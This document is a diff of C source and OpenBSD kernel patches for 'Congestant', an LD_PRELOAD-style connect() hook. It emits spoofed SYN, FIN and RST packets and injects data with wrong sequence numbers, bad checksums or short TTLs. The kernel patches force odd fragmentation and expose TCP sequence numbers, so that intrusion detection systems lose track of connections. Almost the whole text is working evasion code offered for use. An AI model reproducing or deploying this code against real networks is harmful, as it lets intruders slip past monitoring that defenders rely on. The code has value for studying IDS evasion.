+/* On the glibc box I tested, you cant dlopen from within
+ * _init, so there is a little hack here */
+
+#if __GLIBC__ == 2
+int cong_start(void)
+#else
+int _init(void)
+#endif
+{
+	void *handle;
+	char *conf;
+
+#ifndef __OpenBSD__
+	handle=dlopen(LIB_PATH,1);
+	if (!handle)
+	{
+		fprintf(stderr,"Congestant Error: Can't load libc.\n");
+		return 0;
+	}
+
+#if __linux__ || (__svr4__ && __sun__) || sgi || __osf__
+	cong_connect = dlsym(handle, "connect");
+#else
+	cong_connect = dlsym(handle, "_connect");
+#endif
+
+	if (!cong_connect)
+	{
+		fprintf(stderr,"Congestant Error: Can't find connect().\n");
+		return -1;
+	}
+#endif	/* not openbsd */
+
+	memset(&cong_config,0,sizeof(struct cong_config));
+
+	if (conf=getenv("CONGCONF"))
+	{
+		char *token;
+		token=strtok(conf,",");
+		while (token)
+		{
+			if (!strcmp(token,"OH"))
+				cong_config.one_host_attack=1;
+			else if (!strcmp(token,"FS"))
+				cong_config.fin_seq=1;
+			else if (!strcmp(token,"RS"))
+				cong_config.rst_seq=1;
+			else if (!strcmp(token,"SS"))
+				cong_config.syn_seq=1;
+			else if (!strcmp(token,"DS"))
+				cong_config.data_seq=1;
+			else if (!strcmp(token,"FC"))
+				cong_config.fin_chk=1;
+			else if (!strcmp(token,"RC"))
+				cong_config.rst_chk=1;
+			else if (!strcmp(token,"SC"))
+				cong_config.syn_chk=1;
+			else if (!strcmp(token,"DC"))
+				cong_config.data_chk=1;
+			else if (!strcmp(token,"FT"))
+			{
+				cong_config.fin_ttl=1;
+				cong_config.ttl=1;
+			}
+			else if (!strcmp(token,"RT"))
+			{
+				cong_config.rst_ttl=1;
+				cong_config.ttl=1;
+			}
+			else if (!strcmp(token,"DT"))
+			{
+				cong_config.data_ttl=1;
+				cong_config.ttl=1;
+			}
+			else if (!strcmp(token,"DEBUG"))
+				cong_debug=1;
+
+			token=strtok(NULL,",");	
+		}
+	}
+	else		/* default to full sneakiness */
+	{
+		cong_config.one_host_attack=1;
+		cong_config.fin_seq=1;
+		cong_config.rst_seq=1;
+		cong_config.syn_seq=1;
+		cong_config.data_seq=1;
+		cong_config.syn_chk=1;
+		cong_debug=1;
+			/* assume they have kernel support */
+			/* attacks are only compiled in under obsd*/
+		cong_config.data_chk=1;
+		cong_config.fin_chk=1;
+		cong_config.rst_chk=1;
+		cong_config.data_ttl=1;
+		cong_config.fin_ttl=1;
+		cong_config.rst_ttl=1;
+		cong_config.ttl=1;
+	}
+
+	cong_init=1;
+}
+
+/* This is our definition of connect */
+
+#if (__svr4__ && __sun__)
+int connect (int __fd, struct sockaddr * __addr, int __len)
+#else
+#if __GLIBC__ == 2
+int connect __P ((int __fd,
+                         __CONST_SOCKADDR_ARG __addr, socklen_t __len))
+#else
+int connect __P ((int __fd, const struct sockaddr * __addr, int __len))
+#endif
+#endif
+{
+	int result,nl;
+	struct sockaddr_in sa;
+
+	long from,to;
+	short src,dest;
+
+	unsigned long fakeseq=424242;
+	int type=SOCK_STREAM;
+	unsigned long realseq=0;
+	unsigned long recvseq=0;
+	int ttl=255,ttlseq;
+
+#if __GLIBC__ == 2
+	if (cong_init==0)
+		cong_start();
+#endif
+
+	if (cong_init++==1)
+		fprintf(stderr,"Congestant v1 by horizon loaded.\n");
+
+/* quick hack so we dont waste time with udp connects */
+
+#ifdef KERNELSUPPORT
+#ifdef __OpenBSD__
+	syscall(242,__fd,&type,&realseq,&recvseq);
+#endif /* openbsd */
+	if (type!=SOCK_STREAM)	
+	{
+		result=syscall(SYS_connect,__fd,__addr,__len);
+		return result;
+	}
+#endif /* kernel support */
+	
+	nl=sizeof(sa);
+	getsockname(__fd,(struct sockaddr *)&sa,&nl);
+	from=sa.sin_addr.s_addr;
+	src=sa.sin_port;
+
+#if __GLIBC__ == 2
+	to=__addr.__sockaddr_in__->sin_addr.s_addr;
+	dest=__addr.__sockaddr_in__->sin_port;
+#else
+	to=((struct sockaddr_in *)__addr)->sin_addr.s_addr;
+	dest=((struct sockaddr_in *)__addr)->sin_port;
+#endif
+
+	if (cong_config.one_host_attack)
+	{
+		cong_send_tcp(inet_addr(FAKEHOST), 
+			to, 4242, dest, 0, 0,
+			TH_SYN, NULL, 0, 0, 254);
+		DEBUG("Spoofed Fake SYN Packet\n");
+	}
+
+	if (cong_config.syn_chk)
+	{
+		/* This is a potential problem that could mess up
+		 * client programs. If necessary, we bind the socket 
+		 * so that we can know what the source port will be
+		 * prior to the connection.
+		 */
+		if (src==0)
+		{
+			bind(__fd,(struct sockaddr *)&sa,nl);
+			getsockname(__fd,(struct sockaddr *)&sa,&nl);
+			from=sa.sin_addr.s_addr;
+			src=sa.sin_port;
+		}
+
+		cong_send_tcp(from, to, src, dest, htonl(fakeseq), 0,
+			TH_SYN, NULL, 0,100, 254);
+		DEBUG("Sent Pre-Connect Desynchronizing SYN.\n");
+		fakeseq++;
+	}
+
+	DEBUG("Connection commencing...\n");
+
+#ifndef __OpenBSD__
+	result=cong_connect(__fd,__addr,__len);
+#else /* not openbsd */
+	result=syscall(SYS_connect,__fd,__addr,__len);
+#endif
+
+	if (result==-1)
+	{
+		if (errno!=EINPROGRESS)
+			return -1;
+		/* Let's only print the warning once */
+		if (cong_init++==2)
+			fprintf(stderr,"Warning: Non-blocking connects might not work right.\n");
+	}
+
+	/* In case an ephemeral port was assigned by connect */
+
+	nl=sizeof(sa);
+	getsockname(__fd,(struct sockaddr *)&sa,&nl);
+	from=sa.sin_addr.s_addr;
+	src=sa.sin_port;
+
+	if (cong_config.syn_seq)
+	{
+		cong_send_tcp(from, to, src, dest, htonl(fakeseq++), 0,
+			TH_SYN, NULL, 0, 0, 254);
+		cong_send_tcp(from, to, src, dest, htonl(fakeseq++), 0,
+			TH_SYN, NULL, 0, 0, 254);
+
+		DEBUG("Sent Desynchronizing SYNs.\n");
+	}
+
+	if (cong_config.data_seq)
+	{
+		cong_send_data(from,to,src,dest,(fakeseq),0,0,254);
+		DEBUG("Inserted 8K of data with incorrect sequence numbers.\n");
+		fakeseq+=8*1024;
+	}
+
+	if (cong_config.fin_seq)
+	{
+		cong_send_tcp(from, to, src, dest, htonl(fakeseq++), 0,
+			TH_FIN, NULL, 0, 0, 254);
+		cong_send_tcp(from, to, src, dest, htonl(fakeseq++),  0,
+			TH_FIN, NULL, 0, 0, 254);
+
+		DEBUG("Spoofed FINs with incorrect sequence numbers.\n");
+	}
+
+	if (cong_config.rst_seq)
+	{	
+		cong_send_tcp(from, to, src, dest, htonl(fakeseq++), 0,
+			TH_RST, NULL, 0, 0, 254);
+		cong_send_tcp(from, to, src, dest, htonl(fakeseq++), 0,
+			TH_RST, NULL, 0, 0, 254);
+
+		DEBUG("Spoofed RSTs with incorrect sequence numbers.\n");
+	}
+
+#ifdef KERNELSUPPORT
+#ifdef __OpenBSD__
+
+	if (cong_config.ttl==1) 
+		if (cong_ttl_cache!=to)
+		{
+			ttl=cong_find_ttl(from,to)-1;
+			cong_ttl_cache=to;
+			cong_ttl=ttl;
+		}
+		else
+			ttl=cong_ttl;
+	if (ttl<0) 
+	{
+		fprintf(stderr,"Warning: The target host is too close for a ttl attack.\n");
+		cong_config.data_ttl=0;	
+		cong_config.fin_ttl=0;	
+		cong_config.rst_ttl=0;	
+		ttl=0;
+	}
+
+	syscall(242,__fd,&type,&realseq,&recvseq);
+	ttlseq=realseq;
+
+#endif /*openbsd */
+
+	if (cong_config.data_ttl)
+	{
+		cong_send_data(from,to,src,dest,(ttlseq),recvseq,0,ttl);
+		DEBUG("Inserted 8K of data with short ttl.\n");
+		ttlseq+=1024*8;
+	}
+
+	if (cong_config.fin_ttl)
+	{
+		cong_send_tcp(from, to, src, dest, htonl(ttlseq++), 
+			htonl(recvseq),TH_FIN, NULL, 0, 0, ttl); 
+		cong_send_tcp(from, to, src, dest, htonl(ttlseq++), 
+			htonl(recvseq),TH_FIN, NULL, 0, 0, ttl); 
+		DEBUG("Spoofed FINs with short ttl.\n");
+	}
+
+	if (cong_config.rst_ttl)
+	{
+		cong_send_tcp(from, to, src, dest, htonl(ttlseq++),
+			htonl(recvseq),TH_RST, NULL, 0, 0, ttl);
+		cong_send_tcp(from, to, src, dest, htonl(ttlseq++),
+			htonl(recvseq),TH_RST, NULL, 0, 0, ttl);
+		DEBUG("Spoofed RSTs with short ttl.\n");
+	}
+
+	if (cong_config.data_chk)
+	{
+		cong_send_data(from,to,src,dest,(realseq),recvseq,100,254);
+		DEBUG("Inserted 8K of data with incorrect TCP checksums.\n");
+		realseq+=1024*8;
+	}
+
+	if (cong_config.fin_chk)
+	{
+		cong_send_tcp(from, to, src, dest, htonl(realseq++), 
+			htonl(recvseq),TH_FIN, NULL, 0, 100, 254); 
+		cong_send_tcp(from, to, src, dest, htonl(realseq++), 
+			htonl(recvseq),TH_FIN, NULL, 0, 100, 254); 
+		DEBUG("Spoofed FINs with incorrect TCP checksums.\n");
+	}
+
+	if (cong_config.rst_chk)
+	{
+		cong_send_tcp(from, to, src, dest, htonl(realseq++),
+			htonl(recvseq),TH_RST, NULL, 0, 100, 254);
+		cong_send_tcp(from, to, src, dest, htonl(realseq++),
+			htonl(recvseq),TH_RST, NULL, 0, 100, 254);
+		DEBUG("Spoofed RSTs with incorrect TCP checksums.\n");
+	}
+
+#endif /* kernel support */
+
+	return result;
+}
+<-->
+<++> congestant/netinet.patch
+Common subdirectories: /usr/src/sys.2.4.orig/netinet/CVS and netinet/CVS
+diff -u /usr/src/sys.2.4.orig/netinet/in.h netinet/in.h
+--- /usr/src/sys.2.4.orig/netinet/in.h	Tue Dec  8 10:32:38 1998
++++ netinet/in.h	Tue Dec  8 10:48:33 1998
+@@ -325,7 +325,10 @@
+ #define IPCTL_IPPORT_LASTAUTO	8
+ #define IPCTL_IPPORT_HIFIRSTAUTO 9
+ #define IPCTL_IPPORT_HILASTAUTO	10
+-#define	IPCTL_MAXID		11
++#define IPCTL_FRAG_HACK_HEAD	11
++#define IPCTL_FRAG_HACK_BODY	12
++#define IPCTL_OPTIONS_HACK	13
++#define	IPCTL_MAXID		14
+ 
+ #define	IPCTL_NAMES { \
+ 	{ 0, 0 }, \
+@@ -339,6 +342,9 @@
+ 	{ "portlast", CTLTYPE_INT }, \
+ 	{ "porthifirst", CTLTYPE_INT }, \
+ 	{ "porthilast", CTLTYPE_INT }, \
++	{ "fraghackhead", CTLTYPE_INT }, \
++	{ "fraghackbody", CTLTYPE_INT }, \
++	{ "optionshack", CTLTYPE_INT }, \
+ }
+ 
+ #ifndef _KERNEL
+diff -u /usr/src/sys.2.4.orig/netinet/ip_input.c netinet/ip_input.c
+--- /usr/src/sys.2.4.orig/netinet/ip_input.c	Tue Dec  8 10:32:41 1998
++++ netinet/ip_input.c	Tue Dec  8 10:48:33 1998
+@@ -106,6 +106,10 @@
+ extern int ipport_hilastauto;
+ extern struct baddynamicports baddynamicports;
+ 
++extern int ip_fraghackhead;
++extern int ip_fraghackbody;
++extern int ip_optionshack;
++
+ extern	struct domain inetdomain;
+ extern	struct protosw inetsw[];
+ u_char	ip_protox[IPPROTO_MAX];
+@@ -1314,6 +1318,15 @@
+ 	case IPCTL_IPPORT_HILASTAUTO:
+ 		return (sysctl_int(oldp, oldlenp, newp, newlen,
+ 		    &ipport_hilastauto));
++	case IPCTL_FRAG_HACK_HEAD:
++		return (sysctl_int(oldp, oldlenp, newp, newlen,
++		    &ip_fraghackhead));
++	case IPCTL_FRAG_HACK_BODY:
++		return (sysctl_int(oldp, oldlenp, newp, newlen,
++		    &ip_fraghackbody));
++	case IPCTL_OPTIONS_HACK:
++		return (sysctl_int(oldp, oldlenp, newp, newlen,
++		    &ip_optionshack));
+ 	default:
+ 		return (EOPNOTSUPP);
+ 	}
+diff -u /usr/src/sys.2.4.orig/netinet/ip_output.c netinet/ip_output.c
+--- /usr/src/sys.2.4.orig/netinet/ip_output.c	Tue Dec  8 10:32:43 1998
++++ netinet/ip_output.c	Tue Dec  8 11:00:14 1998
+@@ -88,6 +88,10 @@
+ extern int ipsec_esp_network_default_level;
+ #endif
+ 
++int ip_fraghackhead=0;
++int ip_fraghackbody=0;
++int ip_optionshack=0;
++
+ /*
+  * IP output.  The packet in mbuf chain m contains a skeletal IP
+  * header (with len, off, ttl, proto, tos, src, dst).
+@@ -124,6 +128,9 @@
+ 	struct inpcb *inp;
+ #endif
+ 
++	/* HACK */
++	int fakeheadmtu;
++
+ 	va_start(ap, m0);
+ 	opt = va_arg(ap, struct mbuf *);
+ 	ro = va_arg(ap, struct route *);
+@@ -144,7 +151,50 @@
+ 		m = ip_insertoptions(m, opt, &len);
+ 		hlen = len;
+ 	}
++	/* HACK */
++	else if (ip_optionshack && !(flags & (IP_RAWOUTPUT|IP_FORWARDING)))
++	{
++		struct mbuf *n=NULL;
++		register struct ip* ip= mtod(m, struct ip*);
++
++		if (m->m_flags & M_EXT || m->m_data - 40 < m->m_pktdat) 
++		{
++			MGETHDR(n, M_DONTWAIT, MT_HEADER);
++			if (n)
++			{
++				n->m_pkthdr.len = m->m_pkthdr.len + 40;
++				m->m_len -= sizeof(struct ip);
++				m->m_data += sizeof(struct ip);
++				n->m_next = m;
++				m = n;
++				m->m_len = 40 + sizeof(struct ip);
++				m->m_data += max_linkhdr;
++				bcopy((caddr_t)ip, mtod(m, caddr_t), 
++					sizeof(struct ip));
++			}
++		} 
++		else 
++		{
++			m->m_data -= 40;
++			m->m_len += 40;
++			m->m_pkthdr.len += 40;
++			ovbcopy((caddr_t)ip, mtod(m, caddr_t), 
++				sizeof(struct ip));
++			n++; /* make n!=0 */
++		}
++		if (n!=0)
++		{
++			ip = mtod(m, struct ip *);
++			memset((caddr_t)(ip+1),0,40);
++			ip->ip_len += 40;
++
++			hlen=60;
++			len=60;	
++		}
++	}
++
+ 	ip = mtod(m, struct ip *);
++
+ 	/*
+ 	 * Fill in IP header.
+ 	 */
+@@ -721,7 +771,15 @@
+ 	/*
+ 	 * If small enough for interface, can just send directly.
+ 	 */
+-	if ((u_int16_t)ip->ip_len <= ifp->if_mtu) {
++
++	/* HACK */
++
++	fakeheadmtu=ifp->if_mtu;
++
++	if ((ip_fraghackhead) && !(flags & (IP_RAWOUTPUT|IP_FORWARDING)))
++		fakeheadmtu=ip_fraghackhead;
++
++	if ((u_int16_t)ip->ip_len <= fakeheadmtu/*ifp->if_mtu*/) {
+ 		ip->ip_len = htons((u_int16_t)ip->ip_len);
+ 		ip->ip_off = htons((u_int16_t)ip->ip_off);
+ 		ip->ip_sum = 0;
+@@ -738,7 +796,10 @@
+ 		ipstat.ips_cantfrag++;
+ 		goto bad;
+ 	}
+-	len = (ifp->if_mtu - hlen) &~ 7;
++
++/* HACK */
++
++	len = (/*ifp->if_mtu*/fakeheadmtu - hlen) &~ 7;
+ 	if (len < 8) {
+ 		error = EMSGSIZE;
+ 		goto bad;
+@@ -748,6 +809,9 @@
+ 	int mhlen, firstlen = len;
+ 	struct mbuf **mnext = &m->m_nextpkt;
+ 
++	/*HACK*/
++	int first=0;
++
+ 	/*
+ 	 * Loop through length of segment after first fragment,
+ 	 * make new header and copy data of each part and link onto chain.
+@@ -755,7 +819,9 @@
+ 	m0 = m;
+ 	mhlen = sizeof (struct ip);
+ 	for (off = hlen + len; off < (u_int16_t)ip->ip_len; off += len) {
+-		MGETHDR(m, M_DONTWAIT, MT_HEADER);
++		if (first && ip_fraghackbody)
++			len=(ip_fraghackbody-hlen) &~7;
++		MGETHDR(m,  M_DONTWAIT, MT_HEADER);
+ 		if (m == 0) {
+ 			error = ENOBUFS;
+ 			ipstat.ips_odropped++;
+@@ -791,6 +857,7 @@
+ 		mhip->ip_sum = 0;
+ 		mhip->ip_sum = in_cksum(m, mhlen);
+ 		ipstat.ips_ofragments++;
++		first=1;
+ 	}
+ 	/*
+ 	 * Update first fragment by trimming what's been copied out
+Common subdirectories: /usr/src/sys.2.4.orig/netinet/libdeslite and netinet/libdeslite
+diff -u /usr/src/sys.2.4.orig/netinet/tcp_subr.c netinet/tcp_subr.c
+--- /usr/src/sys.2.4.orig/netinet/tcp_subr.c	Tue Dec  8 10:32:45 1998
++++ netinet/tcp_subr.c	Tue Dec  8 10:48:33 1998
+@@ -465,3 +465,18 @@
+ 	if (tp)
+ 		tp->snd_cwnd = tp->t_maxseg;
+ }
++
++/* HACK - This is a tcp subroutine added to grab the sequence numbers */
++
++void tcp_getseq(struct socket *so, struct mbuf *m)
++{
++	struct inpcb *inp;
++	struct tcpcb *tp;
++
++	if ((inp=sotoinpcb(so)) && (tp=intotcpcb(inp)))
++	{
++		m->m_len=sizeof(unsigned long)*2;
++		*(mtod(m,unsigned long *))=tp->snd_nxt;
++		*((mtod(m,unsigned long *))+1)=tp->rcv_nxt;
++	}
++}
+diff -u /usr/src/sys.2.4.orig/netinet/tcp_usrreq.c netinet/tcp_usrreq.c
+--- /usr/src/sys.2.4.orig/netinet/tcp_usrreq.c	Tue Dec  8 10:32:45 1998
++++ netinet/tcp_usrreq.c	Tue Dec  8 10:48:33 1998
+@@ -363,6 +363,10 @@
+ 		in_setsockaddr(inp, nam);
+ 		break;
+ 
++	case PRU_SOCKINFO:
++		tcp_getseq(so,m);
++		break;
++
+ 	case PRU_PEERADDR:
+ 		in_setpeeraddr(inp, nam);
+ 		break;
+diff -u /usr/src/sys.2.4.orig/netinet/tcp_var.h netinet/tcp_var.h
+--- /usr/src/sys.2.4.orig/netinet/tcp_var.h	Tue Dec  8 10:32:45 1998
++++ netinet/tcp_var.h	Tue Dec  8 10:48:34 1998
+@@ -291,6 +291,8 @@
+ void	 tcp_pulloutofband __P((struct socket *,
+ 	    struct tcpiphdr *, struct mbuf *));
+ void	 tcp_quench __P((struct inpcb *, int));
++/*HACK*/
++void	 tcp_getseq __P((struct socket *, struct mbuf *));
+ int	 tcp_reass __P((struct tcpcb *, struct tcpiphdr *, struct mbuf *));
+ void	 tcp_respond __P((struct tcpcb *,
+ 	    struct tcpiphdr *, struct mbuf *, tcp_seq, tcp_seq, int));
+<-->
+<++> congestant/kern.patch
+--- /usr/src/sys.2.4.orig/kern/uipc_syscalls.c	Thu Dec  3 11:00:01 1998
++++ kern/uipc_syscalls.c	Thu Dec  3 11:13:44 1998
+@@ -924,6 +924,53 @@
+ }
+ 
+ /*
++ * Get socket information.  HACK 
++ */
++
++/* ARGSUSED */
++int
++sys_getsockinfo(p, v, retval)
++	struct proc *p;
++	void *v;
++	register_t *retval;
++{
++	register struct sys_getsockinfo_args /* {
++		syscallarg(int) fdes;
++		syscallarg(int *) type;
++		syscallarg(int *) seq;
++		syscallarg(int *) ack;
++	} */ *uap = v;
++	struct file *fp;
++	register struct socket *so;
++	struct mbuf *m;
++	int error;
++
++	if ((error = getsock(p->p_fd, SCARG(uap, fdes), &fp)) != 0)
++		return (error);
++
++	so = (struct socket *)fp->f_data;
++
++	error = copyout((caddr_t)&(so->so_type), (caddr_t)SCARG(uap, type), (u_int)sizeof(short));
++
++	if (!error && (so->so_type==SOCK_STREAM))
++	{
++		m = m_getclr(M_WAIT, MT_DATA);
++		if (m == NULL)
++			return (ENOBUFS);
++
++		error = (*so->so_proto->pr_usrreq)(so, PRU_SOCKINFO, m, 0, 0);
++
++		if (!error)
++			error = copyout(mtod(m,caddr_t), (caddr_t)SCARG(uap, seq), (u_int)sizeof(long));
++		if (!error)
++			error = copyout(mtod(m,caddr_t)+sizeof(long), (caddr_t)SCARG(uap, ack), (u_int)sizeof(long));
++		m_freem(m);
++	}
++
++	return error;
++}
++
++/*
+  * Get name of peer for connected socket.
+  */
+ /* ARGSUSED */
+--- /usr/src/sys.2.4.orig/kern/syscalls.master	Thu Dec  3 11:00:00 1998
++++ kern/syscalls.master	Thu Dec  3 11:14:44 1998
+@@ -476,7 +476,8 @@
+ 240	STD		{ int sys_nanosleep(const struct timespec *rqtp, \
+ 			    struct timespec *rmtp); }
+ 241	UNIMPL
+-242	UNIMPL
++242	STD		{ int sys_getsockinfo(int fdes, int *type, \
++			    int *seq, int *ack); }
+ 243	UNIMPL
+ 244	UNIMPL
+ 245	UNIMPL
+<-->
+<++> congestant/sys.patch
+--- /usr/src/sys.2.4.orig/sys/protosw.h	Thu Dec  3 11:00:39 1998
++++ sys/protosw.h	Thu Dec  3 11:16:41 1998
+@@ -148,8 +148,8 @@
+ #define	PRU_SLOWTIMO		19	/* 500ms timeout */
+ #define	PRU_PROTORCV		20	/* receive from below */
+ #define	PRU_PROTOSEND		21	/* send to below */
+-
+-#define	PRU_NREQ		21
++#define PRU_SOCKINFO		22
++#define	PRU_NREQ		22
+ 
+ #ifdef PRUREQUESTS
+ char *prurequests[] = {
+@@ -158,7 +158,7 @@
+ 	"RCVD",		"SEND",		"ABORT",	"CONTROL",
+ 	"SENSE",	"RCVOOB",	"SENDOOB",	"SOCKADDR",
+ 	"PEERADDR",	"CONNECT2",	"FASTTIMO",	"SLOWTIMO",
+-	"PROTORCV",	"PROTOSEND",
++	"PROTORCV",	"PROTOSEND", 	"SOCKINFO",
+ };
+ #endif
+<-->
+
+----[  EOF
